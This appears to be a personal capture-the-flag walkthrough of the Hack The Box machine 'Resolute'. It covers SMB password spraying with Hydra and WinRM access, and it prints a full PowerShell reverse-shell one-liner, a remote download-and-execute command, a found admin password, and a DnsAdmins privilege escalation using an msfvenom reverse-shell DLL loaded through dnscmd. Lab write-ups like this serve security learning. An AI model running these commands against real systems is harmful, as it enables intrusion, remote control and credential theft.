# Resolute
## Enumeration

enum4linux gave us some interesting things:
	- Some users
	- A password for marko : Welcome123!

I tried to connect as marko with the password and it was a fail 

So i decide to try with hydra to try every user with the password.
```bash 
hydra -L names.txt -P password.txt 10.10.10.169 smb
```

[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
#user part
so i can connect and enum as melanie with smbclient - smbmap	
```bash
smbmap -u melanie -H 10.10.10.169 -p Welcome123!
smbclient //10.10.10.169/SYSVOL -U melanie -p
```

i used the ruby exploit to connect on port 5985 (WinRm)

reserveshell Oneliner (not usefull here):
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.20",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

usefull privesc tool 
```bash 
iex (New-Object Net.WebClient).DownloadString(‘http://10.10.14.21:8899/PowerUp.ps1’)
```

after running windows-privesc-check2.exe:
```
Some programs/directories in the path of the user used to perform this audit have weak permissions.

The following directories in the current user's PATH can be manipulated by non-administrator users:

File C:\Users\melanie\AppData\Local\Microsoft\WindowsApps has weak permissions: ALLOW MEGABANK\melanie: FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_WRITE_EA FILE_DELETE_CHILD FILE_WRITE_ATTRIBUTES DELETE WRITE_DAC WRITE_OWNER

or 

The security policy setting 'User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode' is set to 'Elevate without prompting' or 'Prompt for consent for non-Windows binaries' (default). This allows malicious programs to elevate without the user agreeing. Metasploit and other free tools can perform such escalation.

The following registry key shows the current policy setting:

    Reg key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin, Value: 5
```

```powershell
Get-ChildItem -filter *history* -Recurse -ErrorAction SilentlyContinue -Force
```

C:\pstranscripts\20191203> gci -H

-H stands for hidden files.... 

ryan Serv3r4Admin4cc123!

#root part
from here if we type :
```powershell
whoami /all
```
we can see :
```
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
```

which is the same SID
there is an explanation page for the DnsAdmin exploit :
```url 
	https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
```
need to create a malicious dll with: 
```	
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f dll > privesc.dll
```
then create a smb share:
```
	sudo smbserver.py lololol /home/floki/HackTheBox/resolute
```
dont forget our listener too :
```
nc -lvnp 4444
```
then grab into the share the malicious dll and use it

```
*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.28\LOLOLOL\privesc.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\Resolute.megabank.local stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
*Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe \\Resolute.megabank.local start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1560
        FLAGS              :
```
